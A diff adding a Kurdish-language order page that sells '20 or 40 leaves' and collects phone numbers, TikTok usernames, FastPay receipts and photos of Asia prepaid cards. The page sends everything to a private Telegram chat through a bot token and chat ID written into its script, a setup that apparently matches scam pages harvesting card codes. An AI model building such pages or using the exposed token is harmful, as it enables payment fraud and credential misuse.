@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دۆلاری لیبی هیوا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 15px;
+            color: #333;
+        }
+        .container {
+            max-width: 100%;
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .logo img {
+            width: 150px;
+            height: auto;
+            border-radius: 10px;
+        }
+        h1 {
+            color: #0066cc;
+            text-align: center;
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .price-option {
+            border: 1px solid #ddd;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .price-option h3 {
+            margin: 0;
+            font-size: 16px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .upload-area {
+            border: 2px dashed #ddd;
+            padding: 15px;
+            text-align: center;
+            margin-top: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 15px;
+        }
+        small {
+            font-size: 12px;
+            color: #666;
+            display: block;
+            margin-top: 5px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://i.ibb.co/kf16Ds4/Screenshot-2025-06-06-05-06-08-907-com-zhiliaoapp-musically-edit.jpg" alt="دۆلاری لیبی هیوا">
+        </div>
+        <h1>دۆلاری لیبی هیوا</h1>
+        <h2>نرخی گەڵاکان</h2>
+        
+        <div class="price-option" onclick="selectOption(this, '20')">
+            <h3>20 گەڵا - 400 هەزار</h3>
+        </div>
+        
+        <div class="price-option" onclick="selectOption(this, '40')">
+            <h3>40 گەڵا - 700 هەزار</h3>
+        </div>
+        
+        <div class="form-group">
+            <label for="phone">ژمارە مۆبایلی:</label>
+            <input type="tel" id="phone" placeholder="7712345678" pattern="[0-9]{10}">
+            <small>(بەبێ +964 بنووسە)</small>
+        </div>
+        
+        <div class="form-group">
+            <label for="tiktok">یوزەری تیکتۆک:</label>
+            <input type="text" id="tiktok" placeholder="@username">
+        </div>
+        
+        <div class="form-group">
+            <label for="payment">پارەدان:</label>
+            <select id="payment" onchange="showPaymentMethod()">
+                <option value="">هەڵبژێرە</option>
+                <option value="fastpay">فاستپەی</option>
+                <option value="asia">کارتی ئاسیا</option>
+            </select>
+        </div>
+        
+        <div id="fastpay-method" class="form-group" style="display:none;">
+            <label>وێنەی پارەدان:</label>
+            <div class="upload-area">
+                <p>وێنەکە هەڵبگرە</p>
+                <input type="file" id="fastpay-receipt" accept="image/*">
+            </div>
+            <label for="fastpay-number" style="margin-top:10px;">ژمارە فاستپەی:</label>
+            <input type="text" id="fastpay-number" placeholder="07712345678">
+        </div>
+        
+        <div id="asia-method" class="form-group" style="display:none;">
+            <label>وێنەی کارت:</label>
+            <div class="upload-area">
+                <p>وێنەی کارت هەڵبگرە</p>
+                <input type="file" id="asia-receipt" accept="image/*">
+            </div>
+        </div>
+        
+        <div id="loading" class="loading">
+            <p>تکایە چاوەڕێ بکە... زانیاریەکان نێردەرێن</p>
+        </div>
+        
+        <button onclick="submitForm()">تۆمارکردن</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7959091840:AAGQNGFSnAmxp2PRqU44UmJEVo8ecv_5iUA';
+        const CHAT_ID = '7594104612';
+        
+        let selectedOption = null;
+        
+        function selectOption(element, option) {
+            document.querySelectorAll('.price-option').forEach(el => {
+                el.style.backgroundColor = '';
+            });
+            
+            element.style.backgroundColor = '#e6f2ff';
+            selectedOption = option;
+        }
+        
+        function showPaymentMethod() {
+            const method = document.getElementById('payment').value;
+            
+            document.getElementById('fastpay-method').style.display = 'none';
+            document.getElementById('asia-method').style.display = 'none';
+            
+            if (method === 'fastpay') {
+                document.getElementById('fastpay-method').style.display = 'block';
+            } else if (method === 'asia') {
+                document.getElementById('asia-method').style.display = 'block';
+            }
+        }
+        
+        async function submitForm() {
+            // پشکنینی زانیاریەکان
+            if (!selectedOption) {
+                alert('تکایە ژمارەی گەڵاکان هەڵبژێرە');
+                return;
+            }
+            
+            const phone = document.getElementById('phone').value;
+            if (!phone || !/^[0-9]{10}$/.test(phone)) {
+                alert('ژمارە مۆبایلی 10 ژمارەیی بنووسە (بەبێ +964)');
+                return;
+            }
+            
+            const tiktok = document.getElementById('tiktok').value;
+            if (!tiktok) {
+                alert('تکایە یوزەری تیکتۆک بنووسە');
+                return;
+            }
+            
+            const payment = document.getElementById('payment').value;
+            if (!payment) {
+                alert('تکایە شێوازی پارەدان هەڵبژێرە');
+                return;
+            }
+            
+            let receiptFile = null;
+            let paymentDetails = '';
+            
+            if (payment === 'fastpay') {
+                receiptFile = document.getElementById('fastpay-receipt').files[0];
+                const number = document.getElementById('fastpay-number').value;
+                
+                if (!receiptFile) {
+                    alert('تکایە وێنەی پارەدان هەڵبگرە');
+                    return;
+                }
+                
+                if (!number) {
+                    alert('تکایە ژمارە فاستپەیەکە بنووسە');
+                    return;
+                }
+                
+                paymentDetails = `فاستپەی: ${number}`;
+            } else if (payment === 'asia') {
+                receiptFile = document.getElementById('asia-receipt').files[0];
+                
+                if (!receiptFile) {
+                    alert('تکایە وێنەی کارت هەڵبگرە');
+                    return;
+                }
+                
+                paymentDetails = `کارتی ئاسیا`;
+            }
+            
+            // نیشاندانی بارکردن
+            document.getElementById('loading').style.display = 'block';
+            
+            try {
+                // دروستکردنی زانیاریەکان
+                const message = `✅ داواکاری نوێ\n\n` +
+                               `📌 جۆری داواکاری: ${selectedOption === '20' ? '20 گەڵا' : '40 گەڵا'}\n` +
+                               `📞 ژمارە مۆبایل: +964${phone}\n` +
+                               `📱 تیکتۆک: ${tiktok}\n` +
+                               `💳 شێوازی پارەدان: ${paymentDetails}`;
+                
+                // ناردنی نامەکە بۆ بۆت
+                await sendToTelegram(message);
+                
+                // ناردنی وێنەکە بۆ بۆت
+                if (receiptFile) {
+                    await sendPhotoToTelegram(receiptFile);
+                }
+                
+                alert('✅ زانیاریەکان بەسەرکەوتوویی نێردران! بەزودی پەیوەندیت پێوەدەکرێت');
+                
+                // پاککردنەوەی فۆرمەکە
+                resetForm();
+            } catch (error) {
+                console.error('هەڵە لە ناردنی زانیاریەکان:', error);
+                alert('❌ هەڵەیەک ڕوویدا لە ناردنی زانیاریەکان. تکایە دووبارە هەوڵبدەرەوە');
+            } finally {
+                document.getElementById('loading').style.display = 'none';
+            }
+        }
+        
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('کێشە هەیە لە ناردنی نامەکە');
+            }
+        }
+        
+        async function sendPhotoToTelegram(file) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (!response.ok) {
+                throw new Error('کێشە هەیە لە ناردنی وێنەکە');
+            }
+        }
+        
+        function resetForm() {
+            document.querySelectorAll('.price-option').forEach(el => {
+                el.style.backgroundColor = '';
+            });
+            document.getElementById('phone').value = '';
+            document.getElementById('tiktok').value = '';
+            document.getElementById('payment').value = '';
+            document.getElementById('fastpay-number').value = '';
+            document.getElementById('fastpay-receipt').value = '';
+            document.getElementById('asia-receipt').value = '';
+            document.getElementById('fastpay-method').style.display = 'none';
+            document.getElementById('asia-method').style.display = 'none';
+            selectedOption = null;
+        }
+    </script>
+</body>
+</html>
